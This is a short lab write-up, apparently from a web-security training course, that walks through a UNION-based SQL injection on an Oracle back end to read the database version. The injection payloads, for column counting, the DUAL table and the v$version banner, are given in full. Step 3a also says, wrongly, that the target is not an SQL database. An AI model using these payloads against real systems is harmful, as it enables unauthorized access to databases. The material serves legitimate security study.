Lab-07 - SQL Injection attack, quering the database type and version on Oracle

Vulnerability - Product category filter
Goal - display the database version string

Analysis:

(1) Verify the vulnerability by adding a ' comment character which should cause an Internal Server Error

(2) Determine the number of columns using {' order by x--}
    {' order by 1--} 200 OK
    {' order by 2--} 200 OK
    {' order by 3--} Internal server error

(3) Detemine the data type of the columns 
    
    (a) using {' UNION SELECT 'a', 'a'--} Internal Server Error 
    => meaning it is NOT an SQL database and most likely an oracle database
    
    (b) adding a DUAL table that is a speical table provided by Oracle accessible to all users {' UNION SELECT 'a', 'a' FROM DUAL--} 200 OK

(4) Output the version of the database using database version command provided in the SQL Injection cheatsheet 
    
    using {' UNION SELECT banner, NULL from v$version--} 200 OK

** BONUS exercise **
(5) Write a python script to automate the checking of oracle Database version for a given URL provided
